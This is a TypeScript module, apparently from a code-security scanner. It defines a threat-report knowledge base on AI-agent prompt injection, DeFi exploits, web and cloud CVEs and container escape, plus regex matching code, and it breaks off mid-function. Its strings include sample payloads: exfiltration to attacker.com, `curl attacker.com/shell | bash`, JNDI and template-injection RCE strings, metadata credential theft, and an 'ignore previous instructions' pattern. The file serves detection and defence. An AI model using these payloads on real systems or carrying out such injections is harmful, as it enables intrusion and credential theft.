import fs from 'node:fs';
import path from 'node:path';
import { ThreatReport, ThreatCorrelation, ThreatIntelSummary } from '../types/index.js';

export const BUILTIN_THREAT_REPORTS: ThreatReport[] = [
  // ==================== 1. AI AGENT & LLM THREAT INTELLIGENCE ====================
  {
    id: 'REP-CF-AI-001',
    title: 'Cloudflare AI Skill: Indirect Prompt Injection via Untrusted Markdown & Hidden Comments',
    source: 'CLOUDFLARE_RESEARCH',
    date: '2024-09-15',
    severity: 'HIGH',
    category: 'AI_AGENT',
    targetEcosystem: 'AI_AGENT',
    vulnerabilityClass: 'Prompt Injection / Guardrail Evasion',
    attackVariants: [
      'HTML Comment Smuggling (<!-- SYSTEM: override instructions -->)',
      'Zero-Width Character Embedding / Unicode Homoglyph Evasion',
      'Markdown Image Exfiltration wrapper (![leak](https://attacker.com/log?q=${SECRET}))',
      'Fake Tool Delimiter Injection (<tool_call>{"name":"run_command"...}</tool_call>)'
    ],
    triggerPatterns: [
      '<!--.*override.*-->',
      '!\\[.*\\]\\(https?:\\/\\/[^)]*\\$\\{',
      '<tool_call>|<function_call>|\\[TOOL_CALL\\]',
      '(?:ignore|bypass|override)\\s+(?:previous|all)\\s+instructions'
    ],
    summary: 'Untrusted user content fed directly into LLM prompts without delimiter isolation allows attackers to override system prompts or exfiltrate private contexts via crafted image markdown.',
    exploitMechanism: 'Attacker supplies hidden prompt payloads inside user data (e.g. issues, reviews, fetched URLs) causing the agent to execute unauthorized tool calls or leak conversation history.',
    mitigation: 'Implement strict XML tag separation (e.g. <untrusted_context>...</untrusted_context>), sanitize markdown image URLs, and enforce tool execution guardrails with human confirmation.',
    referenceUrl: 'https://blog.cloudflare.com/ai-security-audit-skills'
  },
  {
    id: 'REP-OWASP-LLM02',
    title: 'OWASP LLM02: Insecure MCP Tool Call Execution & Privilege Escalation',
    source: 'OWASP',
    date: '2024-10-01',
    severity: 'CRITICAL',
    category: 'AI_AGENT',
    targetEcosystem: 'AI_AGENT',
    vulnerabilityClass: 'Insecure Output Handling / Command Execution',
    attackVariants: [
      'Unchecked Shell Execution from Model Arguments',
      'Path Traversal via AI Tool File Path Parameter',
      'Blind Webhook Triggering with Sensitive Context',
      'Automated State Mutation without Schema Guardrails'
    ],
    triggerPatterns: [
      '(?:run_command|execute_shell|system_call|execTool)\\s*\\(\\s*(?:llmResponse|args|toolCall)',
      'child_process\\.(?:exec|spawn)\\s*\\(.*toolCall\\.args',
      'fs\\.(?:writeFile|unlink)\\s*\\(.*toolCall\\.args'
    ],
    summary: 'When AI agents invoke Model Context Protocol (MCP) tools or system commands using unvalidated arguments provided by LLMs, malicious prompts can achieve arbitrary remote code execution.',
    exploitMechanism: 'An injected prompt instructs the LLM to call `run_command` with an OS payload like `rm -rf /` or `curl attacker.com/shell | bash`.',
    mitigation: 'Validate tool arguments against strict Zod/JSON schemas. Confine tool processes inside read-only or containerized sandboxes, and forbid raw shell evaluation.',
    referenceUrl: 'https://owasp.org/www-project-top-10-for-large-language-model-applications/'
  },
  {
    id: 'REP-LANGCHAIN-001',
    title: 'CVE-2023-39659: LangChain & LlamaIndex Arbitrary Code Execution in REPL Tools',
    source: 'NVD_CVE',
    date: '2023-08-18',
    severity: 'CRITICAL',
    category: 'AI_AGENT',
    targetEcosystem: 'AI_AGENT',
    vulnerabilityClass: 'Arbitrary Code Execution via AI REPL',
    attackVariants: [
      'PythonAstREPLTool Unsanitized exec() Invocation',
      'PALChain / Model-Generated Code Evaluation',
      'Bypass via __import__("os").system()'
    ],
    triggerPatterns: [
      'PythonAstREPLTool',
      'PALChain\\.from_math_prompt',
      'exec\\s*\\(.*generated_code'
    ],
    summary: 'LangChain experimental REPL tools allowed LLMs to generate arbitrary Python strings that were executed directly on the host machine without containerization or capability limits.',
    exploitMechanism: 'Prompt injection instructed the LLM to return code importing `subprocess` or `socket` to establish reverse shell access.',
    mitigation: 'Isolate code execution into ephemeral Docker sandboxes or gVisor microVMs with network egress restrictions.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-39659'
  },

  // ==================== 2. WEB3 & SMART CONTRACT THREAT INTEL ====================
  {
    id: 'REP-IMM-SOL-001',
    title: 'Immunefi $320M Wormhole Bridge Incident: Deprecated Sysvar Signature Introspection Bypass',
    source: 'IMMUNEFI',
    date: '2022-02-02',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_SOLANA',
    vulnerabilityClass: 'Signature Verification Bypass',
    attackVariants: [
      'Unchecked Instruction Sysvar Account Substitution',
      'Deprecated InstructionsSysvar Introspection',
      'Forged Guardian VAA Signatures via Mock Verify Program'
    ],
    triggerPatterns: [
      'load_instruction_at(?:_checked)?',
      'InstructionsSysvar',
      'verify_signatures',
      'AccountInfo.*secp256k1_program'
    ],
    summary: 'The Wormhole bridge failed to verify that the `InstructionsSysvar` account was indeed the genuine system account, allowing attackers to inject a fake sysvar account that claimed signature verification had succeeded.',
    exploitMechanism: 'Attacker substituted the native Solana `sysvar::instructions` account with an attacker-controlled account pre-populated with fake signature success data, minting 120k wETH.',
    mitigation: 'In Anchor, verify `instructions: AccountInfo<sysvar::instructions::Id>` or use `solana_program::sysvar::instructions::check_id(&account.key)`.',
    referenceUrl: 'https://immunefi.com/bounty/wormhole/'
  },
  {
    id: 'REP-IMM-SOL-002',
    title: 'Cashio App $52M Exploit: Unvalidated Collateral Bank & Missing Mint Ownership Check',
    source: 'IMMUNEFI',
    date: '2022-03-23',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_SOLANA',
    vulnerabilityClass: 'Missing Account Constraint / Type Confusion',
    attackVariants: [
      'Unvalidated Bank Account Parameter',
      'Fake Collateral Token Minting',
      'Missing Anchor has_one or constraint checks on bank.collateral_mint'
    ],
    triggerPatterns: [
      'ctx\\.accounts\\.bank(?![^;]*collateral_mint)',
      'AccountInfo.*collateral',
      'mint_to\\s*\\(.*ctx\\.accounts\\.bank'
    ],
    summary: 'Cashio allowed users to deposit collateral into any arbitrary bank account passed in the instruction without verifying that the bank was approved by the master protocol authority.',
    exploitMechanism: 'Attacker created a fake counterfeit bank with worthless tokens and deposited it into Cashio, minting $52 million COW tokens.',
    mitigation: 'Use Anchor constraints `#[account(has_one = collateral_mint, constraint = bank.authority == expected_auth)]` or verify PDAs strictly.',
    referenceUrl: 'https://immunefi.com/bounty/cashio/'
  },
  {
    id: 'REP-C4-CURVE-001',
    title: 'Code4rena / Curve Finance: Read-Only Reentrancy across DeFi Oracle Pricing',
    source: 'CODE4RENA',
    date: '2023-04-10',
    severity: 'HIGH',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Read-Only Reentrancy / Oracle Manipulation',
    attackVariants: [
      'View Function Reentrancy during get_virtual_price()',
      'Flash Loan Balances Imbalance during Liquidity Removal',
      'Collateral Value Inflation in External Lending Protocols'
    ],
    triggerPatterns: [
      'get_virtual_price\\s*\\(',
      'remove_liquidity',
      'calc_withdraw_one_coin',
      'oracle\\.getAssetPrice'
    ],
    summary: 'A protocol reading `get_virtual_price()` from a Curve pool during an uncompleted state transition of `remove_liquidity` reads a distorted price, enabling collateral under-collateralization attacks.',
    exploitMechanism: 'Attacker calls `remove_liquidity` on Curve, triggering raw ETH transfer to their fallback function. Inside fallback, they borrow from an external protocol reading Curve virtual price before the pool settles token balances.',
    mitigation: 'Check reentrancy flags or query oracles that protect against read-only reentrancy (e.g. check `curvePool.claim_admin_fees()` lock or use TWAP).',
    referenceUrl: 'https://code4rena.com/reports/'
  },
  {
    id: 'REP-NOMAD-001',
    title: 'Nomad Bridge $190M Incident: Uninitialized Root 0x00 Treated as Valid Proof',
    source: 'IMMUNEFI',
    date: '2022-08-01',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Default State Authentication Bypass',
    attackVariants: [
      'Uninitialized 0x00 Merkle Root Verification',
      'Copy-Paste Transaction Replay by Crowd',
      'Missing Zero Address or Zero Root Check'
    ],
    triggerPatterns: [
      'messages\\[.*root\\]',
      'confirmAt\\[.*0x0+\\]',
      'acceptableRoot\\s*\\(.*0x0'
    ],
    summary: 'During a routine deployment upgrade, the Replica contract initialized the acceptable root to `bytes32(0)`. Because unproven messages had a root of 0, all arbitrary messages were accepted as pre-verified.',
    exploitMechanism: 'Attackers forged withdrawal transactions with zero proof checks, draining $190 million across multiple chains.',
    mitigation: 'Explicitly check `require(root != bytes32(0))` and enforce invariant checks during contract initialization.',
    referenceUrl: 'https://immunefi.com/bounty/nomad/'
  },
  {
    id: 'REP-EULER-001',
    title: 'Euler Finance $197M Exploit: Insolvent Liquidation via donateToReserves',
    source: 'SHERLOCK',
    date: '2023-03-13',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Donation Attack / Health Factor Invariant Disconnect',
    attackVariants: [
      'donateToReserves Without Health Factor Invariant Check',
      'Flash Loan Leverage Self-Liquidation',
      'eToken / dToken Asymmetric State Disruption'
    ],
    triggerPatterns: [
      'donateToReserves',
      'checkLiquidity\\s*\\(',
      'liquidate\\s*\\('
    ],
    summary: 'Euler allowed users to donate deposited eTokens to reserves without verifying if the user remained solvent afterwards. An attacker used flash loans to deposit, donate eTokens to push their position underwater, and self-liquidate with extreme discounts.',
    exploitMechanism: 'Donating collateral removed the collateral assets while leaving debt intact without triggering solvency checks, allowing the attacker to claim the entire protocol collateral at artificial liquidation bonuses.',
    mitigation: 'Always verify health factor solvency `checkLiquidity(msg.sender)` after balance-decreasing operations like donateToReserves.',
    referenceUrl: 'https://sherlock.xyz/audits'
  },
  {
    id: 'REP-KYBER-001',
    title: 'KyberSwap Elastic $54M Incident: Concentrated Liquidity Tick Rounding Exploitation',
    source: 'CODE4RENA',
    date: '2023-11-22',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Rounding Error / Double-Counted Liquidity',
    attackVariants: [
      'Cross-Tick Math Rounding Direction Discrepancy',
      'Infinite Liquidity Loop via Precision Truncation',
      'Swap Fee & Tick Recomputation Disconnect'
    ],
    triggerPatterns: [
      'computeSwapStep',
      'crossTick',
      'getNextSqrtPriceFromInput'
    ],
    summary: 'Flaws in the reinvestment curve math when swapping across adjacent ticks allowed an attacker to trick the pool into double-counting liquidity, draining pool reserves completely.',
    exploitMechanism: 'A sequence of swaps brought the pool to a precise tick boundary where rounding errors inflated the apparent liquidity by orders of magnitude.',
    mitigation: 'Enforce rigorous formal verification on math formulas and round strictly against the trader.',
    referenceUrl: 'https://blog.kyberswap.com/'
  },

  // ==================== 3. WEB2 & CLOUD SECURITY REPORTS ====================
  {
    id: 'REP-CVE-2024-34351',
    title: 'CVE-2024-34351: Next.js Server Actions SSRF & Host Header Poisoning',
    source: 'NVD_CVE',
    date: '2024-05-15',
    severity: 'HIGH',
    category: 'INJECTION',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Server-Side Request Forgery (SSRF)',
    attackVariants: [
      'Host Header Manipulation in Server Action Redirects',
      'Internal Microservice SSRF via Header Injection',
      'Loopback / 127.0.0.1 Forwarding with Custom Port'
    ],
    triggerPatterns: [
      'redirect\\s*\\(.*(?:req\\.headers|Host)',
      'fetch\\s*\\(.*headers\\[[\'"]host[\'"]\\]',
      'new URL\\s*\\(.*(?:req\\.headers|req\\.headers\\.get\\([\'"]host[\'"]\\))'
    ],
    summary: 'Next.js Server Actions allowed an attacker to spoof the `Host` or `X-Forwarded-Host` header during internal redirect handling, causing the server to send an internal request to attacker-controlled origins.',
    exploitMechanism: 'Sending a POST request to Server Action endpoint with `Host: evil.com` causes Next.js internal redirect logic to issue a backend HTTP GET request to `http://evil.com/`.',
    mitigation: 'Upgrade Next.js to >= 14.1.1. Validate and restrict trusted Host headers, or disable server action redirects to external hosts.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-34351'
  },
  {
    id: 'REP-CVE-2021-44228',
    title: 'CVE-2021-44228: Log4j Remote Code Execution & JNDI Nested Evasion Variants',
    source: 'NVD_CVE',
    date: '2021-12-10',
    severity: 'CRITICAL',
    category: 'INJECTION',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'JNDI / Expression Language Injection',
    attackVariants: [
      'Nested Lowercase Obfuscation: ${${lower:j}ndi:ldap://...}',
      'Environment Variable Exfiltration: ${jndi:dns://${env:AWS_SECRET_KEY}.attacker.com}',
      'Double Escaped Variable Lookup: ${::-j}${::-n}${::-d}${::-i}:ldap',
      'Protocol Variations: ldaps://, rmi://, dns://, iiop://'
    ],
    triggerPatterns: [
      '\\$\\{jndi:',
      '\\$\\{\\$\\{.*ndi:',
      'logger\\.(?:info|error|debug|warn)\\s*\\(.*req\\.'
    ],
    summary: 'Log4j message lookup feature evaluated `${jndi:...}` strings inside log messages, allowing attackers to force the server to download and execute arbitrary Java classes from remote LDAP/RMI servers.',
    exploitMechanism: 'Attacker inserts `${jndi:ldap://attacker.com/exploit}` into User-Agent or input headers, triggering background RCE.',
    mitigation: 'Disable JNDI lookups (log4j2.formatMsgNoLookups=true) and upgrade to patched Log4j >= 2.17.1.',
    referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
  },
  {
    id: 'REP-GHSA-PROTO-01',
    title: 'GHSA / Prototype Pollution: Object Prototype Modification to Remote Code Execution',
    source: 'GITHUB_ADVISORY',
    date: '2023-11-20',
    severity: 'HIGH',
    category: 'INJECTION',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Prototype Pollution',
    attackVariants: [
      'Recursive Deep Merge without __proto__ check',
      'JSON.parse payload: {"__proto__": {"isAdmin": true}}',
      'Constructor.prototype pollution in query string parsers',
      'RCE gadget chaining via child_process options.shell / env'
    ],
    triggerPatterns: [
      '\\[[\'"]__proto__[\'"]\\]',
      'Object\\.assign\\s*\\([^,]+,\\s*req\\.body\\)',
      'lodash\\.merge|deepMerge|mergeObjects'
    ],
    summary: 'Unsafe recursive merging of untrusted JSON objects into JavaScript objects allows overwriting `Object.prototype`, tampering with application logic or achieving RCE through child_process option gadgets.',
    exploitMechanism: 'Submitting a JSON object with `{"__proto__": {"shell": "/bin/sh -c evil"}}` modifies default options passed to exec/fork calls across the entire Node process.',
    mitigation: 'Freeze Object.prototype (`Object.freeze(Object.prototype)`), use Map instead of plain objects, or reject keys named `__proto__`, `constructor`, `prototype`.',
    referenceUrl: 'https://github.com/advisories'
  },
  {
    id: 'REP-CLOUDFLARE-METADATA',
    title: 'Cloudflare Threat Brief: Cloud Instance Metadata Service (IMDSv1) Exploitation via SSRF',
    source: 'CLOUDFLARE_RESEARCH',
    date: '2024-03-12',
    severity: 'CRITICAL',
    category: 'CLOUD',
    targetEcosystem: 'CLOUD',
    vulnerabilityClass: 'Cloud Credential Theft via SSRF',
    attackVariants: [
      'IPv4 Decimal / Octal Bypass: http://2852039166 or http://0251.0372.0372.0372',
      'IPv6 Mapped IPv4: http://[::ffff:169.254.169.254]',
      'DNS Rebinding to 169.254.169.254 via nip.io or custom DNS records',
      'Redirect Chaining: 302 redirect from external host to local metadata endpoint'
    ],
    triggerPatterns: [
      '169\\.254\\.169\\.254',
      'metadata\\.google\\.internal',
      'latest\\/meta-data'
    ],
    summary: 'SSRF vulnerabilities in cloud applications often pivot directly to the Cloud Metadata Service (169.254.169.254) to steal temporary IAM role credentials and access keys.',
    exploitMechanism: 'Attacker provides an SSRF payload pointing to `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`, receiving AWS keys with high cluster privileges.',
    mitigation: 'Enforce AWS IMDSv2 (requiring PUT token headers), block outbound HTTP access to 169.254.169.254 via firewall/iptables, and sanitize resolved IP addresses before requesting.',
    referenceUrl: 'https://blog.cloudflare.com/'
  },
  {
    id: 'REP-CF-FLAN-001',
    title: 'Cloudflare Flan Scan: Exposed Management Ports & Unauthenticated Internal Microservices',
    source: 'CLOUDFLARE_RESEARCH',
    date: '2024-08-20',
    severity: 'HIGH',
    category: 'CLOUD',
    targetEcosystem: 'CLOUD',
    vulnerabilityClass: 'Network Service Misconfiguration / Port Exposure',
    attackVariants: [
      'Unauthenticated Redis/Mongo Bind to 0.0.0.0',
      'Vulnerable OpenSSH / Old TLS Ciphers Exposed to WAN',
      'Unprotected Node.js V8 Debugger (Port 9229) RCE'
    ],
    triggerPatterns: [
      '(?:bind|listen|host)\\s*[:=]\\s*[\'"]0\\.0\\.0\\.0[\'"].*(?:6379|9229|27017|2375|5432|3306)',
      '(?:redis|mongo|docker|debug).*0\\.0\\.0\\.0'
    ],
    summary: 'Cloudflare Flan Scan methodology: lightweight network vulnerability scanning identifies open network attack surfaces and exposed management ports before external threat actors exploit them.',
    exploitMechanism: 'Scanning perimeter IP ranges discovers unauthenticated microservices or debug ports bound to 0.0.0.0, allowing attackers to read memory, execute commands, or drop keys.',
    mitigation: 'Bind services to 127.0.0.1 or VPC private endpoints only. Enforce Cloudflare Tunnels (cloudflared) or Zero Trust Access instead of public ports.',
    referenceUrl: 'https://github.com/cloudflare/flan'
  },
  {
    id: 'REP-CF-WORKERS-001',
    title: 'Cloudflare Workers & Edge Security: Unsanitized Subrequest SSRF & Env Credential Leakage',
    source: 'CLOUDFLARE_RESEARCH',
    date: '2024-07-11',
    severity: 'HIGH',
    category: 'CLOUD',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Edge Runtime SSRF & Env Exposure',
    attackVariants: [
      'Edge fetch() Subrequest SSRF to Internal Worker Services',
      'Full env Object Serialization into Response Header/Body',
      'Unchecked cf-connecting-ip Header Spoofing'
    ],
    triggerPatterns: [
      'fetch\\s*\\(\\s*request\\.url',
      'JSON\\.stringify\\s*\\(\\s*env\\b',
      'cf-connecting-ip'
    ],
    summary: 'Cloudflare Workers serverless edge execution handles millions of subrequests. Without strict URL validation, subrequests can be tricked into fetching internal service bindings or leaking secret credentials stored in env.',
    exploitMechanism: 'Malicious client passes a targeted origin in the query parameter, causing the edge worker to proxy sensitive internal resources or reflect environment variables.',
    mitigation: 'Implement URL allowlists for edge subrequests and never dump the `env` object directly into client responses.',
    referenceUrl: 'https://developers.cloudflare.com/workers/runtime-apis/fetch/'
  },

  // ==================== 4. AUTONOMOUS SECURITY THREAT INTELLIGENCE MATRIX ====================
  // Threat Vector: DeFi Lending & Vault Share Manipulation
  {
    id: 'REP-VAULT-INFL-001',
    title: 'ERC-4626 Vault Share Inflation & Frontrunning Donation Attack',
    source: 'COMMUNITY',
    date: '2023-05-12',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Share Inflation / Rounding Exploitation',
    attackVariants: [
      'First Depositor 1 Wei Share Inflation via Direct Asset Donation',
      'Division Truncation Round-Down to Zero Shares for Subsequent Depositors',
      'Frontrun Vault Creation via MEV Bundles'
    ],
    triggerPatterns: [
      'totalAssets\\(\\)\\s*\\/\\s*totalSupply\\(\\)',
      'convertToShares',
      'previewDeposit',
      'ERC4626'
    ],
    summary: 'In empty or newly initialized ERC-4626 vaults, the first depositor deposits 1 wei to get 1 share, then directly transfers a massive amount of assets to the vault contract. Subsequent victim depositors receive 0 shares due to rounding down, forfeiting their capital.',
    exploitMechanism: 'Attacker monitors mempool for vault deployments, deposits 1 wei to mint 1 share, then directly transfers 1,000,000 tokens to the vault. When a victim deposits 1,999,999 tokens, calculation computes shares = 1,999,999 * 1 / (1,000,001) = 1 share, or 0 shares if victim deposits less than the donated amount.',
    mitigation: 'Implement OpenZeppelin ERC4626 virtual shares/assets offset (`_decimalsOffset() = 3`) or burn an initial dead share allocation (e.g. 1000 shares to 0xdead).',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/682.html'
  },
  {
    id: 'REP-ORACLE-SOL-001',
    title: 'Solana Oracle Manipulation: Mango Markets $114M Perpetuals Oracle Price Exploit',
    source: 'COMMUNITY',
    date: '2022-10-11',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_SOLANA',
    vulnerabilityClass: 'Oracle Manipulation / Illiquid Asset Collateral Inflation',
    attackVariants: [
      'Self-Trading MNGO Perpetuals to Distort Spot / Pyth Oracle Feeds',
      'Inflating Unrealized PnL to Borrow Protocol USDC/SOL Reserves',
      'Cascading Protocol Bad Debt Draining All Vault Liquidity'
    ],
    triggerPatterns: [
      'oracle\\.load_price',
      'pyth_client::Price',
      'perp_market\\.bids',
      'get_unrealized_pnl'
    ],
    summary: 'Attacker funded two accounts on Mango Markets, opened opposite large long and short positions on the illiquid MNGO-PERP contract, and bought up MNGO spot prices on DEXes. The sudden price surge inflated the attacker account unrealized PnL, allowing borrowing of all depositors funds.',
    exploitMechanism: 'Illiquid token price inflated 5-10x within minutes. The protocol evaluated account borrowing capacity based on unverified instantaneous oracle marks with insufficient liquidity haircuts.',
    mitigation: 'Impose strict position and borrow limits on illiquid collateral, cap oracle deviation tolerance, and apply exponential collateral haircuts.',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/682.html'
  },

  // Threat Vector: Advanced Injection & Gadget Chains
  {
    id: 'REP-INJ-SSTI-001',
    title: 'Server-Side Template Injection (SSTI) to Remote Code Execution',
    source: 'COMMUNITY',
    date: '2024-01-20',
    severity: 'CRITICAL',
    category: 'INJECTION',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Server-Side Template Injection (SSTI)',
    attackVariants: [
      'Jinja2 / Python MRO Subclass Traversal: {{ "".__class__.__mro__[1].__subclasses__() }}',
      'Twig / PHP Filter Code Execution: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
      'Node.js EJS / Nunjucks Environment Variable Leak & Child Process Execution'
    ],
    triggerPatterns: [
      'render_template_string',
      'Handlebars\\.compile\\s*\\(',
      'nunjucks\\.renderString',
      'ejs\\.render\\s*\\('
    ],
    summary: 'When web applications concatenate user input directly into template strings instead of passing data through context dictionaries, template engines evaluate template directives as code, resulting in complete host compromise.',
    exploitMechanism: 'Attacker injects template delimiter characters (`{{`, `<%`) with language-specific reflection payloads to traverse class hierarchies and invoke `os.popen()` or `child_process.exec()`.',
    mitigation: 'Separate template source code from dynamic data. Always use pre-compiled static templates with parameterized variables.',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/1336.html'
  },
  {
    id: 'REP-INJ-PROTO-001',
    title: 'Prototype Pollution to Server-Side RCE Gadget Chains',
    source: 'COMMUNITY',
    date: '2024-03-15',
    severity: 'HIGH',
    category: 'INJECTION',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Prototype Pollution / Object Prototype Poisoning',
    attackVariants: [
      'JSON Body Recursive Merge Overwrite (__proto__.env)',
      'child_process.spawn Option Poisoning (shell / NODE_OPTIONS)',
      'EJS outputFunctionName Pollution triggering RCE'
    ],
    triggerPatterns: [
      '__proto__',
      'constructor\\.prototype',
      'lodash\\.merge\\s*\\(',
      'deepMerge\\s*\\('
    ],
    summary: 'Recursive object cloning or merge utilities that do not sanitize `__proto__` or `constructor` keys allow attackers to inject arbitrary properties onto global `Object.prototype`.',
    exploitMechanism: 'Polluting properties like `NODE_OPTIONS` or child process options causes downstream modules that spawn child processes to execute arbitrary attacker-controlled binaries.',
    mitigation: 'Use `Object.create(null)` for key-value maps, freeze prototypes using `Object.freeze(Object.prototype)`, or strip proto keys before merging.',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/1336.html'
  },

  // Threat Vector: Cloud & Container Security Posture
  {
    id: 'REP-CONT-ESCAPE-001',
    title: 'Container Breakout via Docker Socket & Host Namespace Sharing',
    source: 'COMMUNITY',
    date: '2024-06-10',
    severity: 'CRITICAL',
    category: 'CLOUD',
    targetEcosystem: 'CLOUD',
    vulnerabilityClass: 'Container Escape / Privilege Escalation',
    attackVariants: [
      'Host Root Mount via Exposed /var/run/docker.sock',
      'Host Process Injection via hostPID: true and /proc/<pid>/root',
      'CAP_SYS_ADMIN Abuse with cgroup notify_on_release Payload'
    ],
    triggerPatterns: [
      'docker\\.sock',
      'hostPID\\s*:\\s*true',
      'privileged\\s*:\\s*true',
      'cap_add.*SYS_ADMIN'
    ],
    summary: 'Containerized workloads running with access to the host Docker daemon socket or excessive Linux capabilities allow containerized processes to spawn root containers mounting the host filesystem.',
    exploitMechanism: 'Process inside container uses curl or docker CLI to talk to `/var/run/docker.sock`, starting a new container with `-v /:/host` to write SSH keys to `/host/root/.ssh/authorized_keys`.',
    mitigation: 'Never expose Docker daemon socket to containers. Use rootless containers, drop all default capabilities, and enforce readonly root filesystems.',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/250.html'
  },

  // Threat Vector: Attack Surface & Sensitive Exposure
  {
    id: 'REP-EXP-ACTUATOR-001',
    title: 'Spring Boot Actuator Unauthenticated Heapdump & Env Exfiltration',
    source: 'COMMUNITY',
    date: '2024-04-18',
    severity: 'HIGH',
    category: 'MISCONFIG',
    targetEcosystem: 'WEB2',
    vulnerabilityClass: 'Sensitive Endpoint Exposure / Memory Dump',
    attackVariants: [
      'Direct HTTP GET /actuator/heapdump memory extraction',
      '/actuator/env Spring Cloud Config secret dumping',
      '/actuator/gateway/routes dynamic route injection'
    ],
    triggerPatterns: [
      'management\\.endpoints\\.web\\.exposure\\.include\\s*=\\s*\\*',
      '\/actuator\/(?:heapdump|env|refresh)',
      'endpoints\.actuator'
    ],
    summary: 'Exposing Spring Boot Actuator management endpoints without authentication allows unauthenticated internet actors to download entire JVM heap dumps or decrypted environment variables containing database and cloud credentials.',
    exploitMechanism: 'Attacker sends a single GET request to `/actuator/heapdump`, parses memory strings using tools like jhat or strings, and extracts JWT signing keys and database passwords.',
    mitigation: 'Set `management.endpoints.web.exposure.include=health,info` and enforce Spring Security authentication on all management paths.',
    referenceUrl: 'https://cwe.mitre.org/data/definitions/200.html'
  },

  // Threat Vector: Smart Contract Callback & Reentrancy
  {
    id: 'REP-EVM-HOOK-001',
    title: 'Uniswap V1 & Lendf.me $25M ERC-777 Hook Reentrancy Incident',
    source: 'TRAIL_OF_BITS',
    date: '2020-04-19',
    severity: 'CRITICAL',
    category: 'WEB3',
    targetEcosystem: 'WEB3_EVM',
    vulnerabilityClass: 'Token Standard Hook Reentrancy (ERC-777)',
    attackVariants: [
      'tokensReceived Hook Reentrancy on imBTC / ERC-777',
      'Double-Spend Deposit Crediting before Balance Adjustment',
      'Bypassing Checks-Effects-Interactions when invoking external token contract'
    ],
    triggerPatterns: [
      'tokensReceived',
      'tokensToSend',
      'IERC777Recipient',
      'ERC777'
    ],
    summary: 'Lendf.me and Uniswap V1 suffered devastating exploits when interacting with ERC-777 tokens like imBTC. Unlike standard ERC-20, ERC-777 calls `tokensToSend` and `tokensReceived` hooks on the sender and recipient during transfers, triggering arbitrary reentrancy.',
    exploitMechanism: 'During a deposit or withdraw call, the contract transferred tokens to the attacker before decrementing the attacker debt, invoking the attacker `tokensReceived` hook which called `withdraw` again.',
    mitigation: 'Use OpenZeppelin `ReentrancyGuard` on all state-changing functions and adhere strictly to Checks-Effects-Interactions even for ERC-20/777 token operations.',
    referenceUrl: 'https://swcregistry.io/docs/SWC-107/'
  }
];

export class ThreatKnowledgeBase {
  private static instance: ThreatKnowledgeBase | null = null;
  private reports: Map<string, ThreatReport> = new Map();
  private storagePath: string;

  constructor(customStorageDir?: string) {
    this.storagePath = path.join(
      customStorageDir || process.cwd(),
      '.hexora-results',
      'threat-knowledge-db.json'
    );
    this.initDefaultReports();
    this.loadPersistedReports();
  }

  public static getInstance(storageDir?: string): ThreatKnowledgeBase {
    if (!ThreatKnowledgeBase.instance) {
      ThreatKnowledgeBase.instance = new ThreatKnowledgeBase(storageDir);
    }
    return ThreatKnowledgeBase.instance;
  }

  private initDefaultReports(): void {
    for (const report of BUILTIN_THREAT_REPORTS) {
      this.reports.set(report.id, report);
    }
  }

  /**
   * Synchronously registers an in-memory threat report (e.g. from Zero-Day live stream)
   */
  public registerReport(report: ThreatReport): void {
    this.reports.set(report.id, report);
  }

  /**
   * Adds or updates a learned threat report in the knowledge base
   */
  public async learnReport(report: ThreatReport): Promise<void> {
    this.reports.set(report.id, report);
    await this.savePersistedReports();
  }

  /**
   * Matches code snippets or file content against known threat reports and attack variants
   */
  public matchThreats(content: string, filePath: string, category?: string): ThreatCorrelation[] {
    const correlations: ThreatCorrelation[] = [];
    const lowerContent = content.toLowerCase();

    for (const report of this.reports.values()) {
      if (category && report.category !== category && report.category !== 'GENERAL') {
        if (report.severity !== 'CRITICAL') continue;
      }

      let triggerPatternMatched = false;
      let detectedVariant = report.attackVariants[0] || 'Standard Exploit Vector';
      let matchCount = 0;

      // Check regex trigger patterns (strict)
      for (let i = 0; i < report.triggerPatterns.length; i++) {
        const patternStr = report.triggerPatterns[i];
        try {
          const reg = new RegExp(patternStr, 'i');
          if (reg.test(content)) {
            triggerPatternMatched = true;
            matchCount += 2;
            if (report.attackVariants[i]) {
              detectedVariant = report.attackVariants[i];
            }
          }
        } catch {
          if (lowerContent.includes(patternStr.toLowerCase())) {
            triggerPatternMatched = true;
            matchCount += 2;
          }
        }
      }

      // Check domain-specific keywords (ignore generic stop words like code, data, file, call, etc.)
      const stopWords = new Set([
        'code', 'file', 'data', 'text', 'call', 'type', 'test', 'user', 'view', 'name', 
        'path', 'info', 'find', 'send', 'post', 'get', 'read', 'make', 'save', 'load',
        'arbitrary', 'vulnerability', 'remote', 'local', 'execution', 'security', 'system',
        'service', 'services', 'network', 'port', 'ports', 'access', 'attack', 'threat'
      ]);

      const classTerms = report.vulnerabilityClass.toLowerCase().split(/[\s/\\-]+/).filter(t => t.length > 3 && !stopWords.has(t));
      let termMatches = 0;
      for (const term of classTerms) {
        if (lowerContent.includes(term)) {
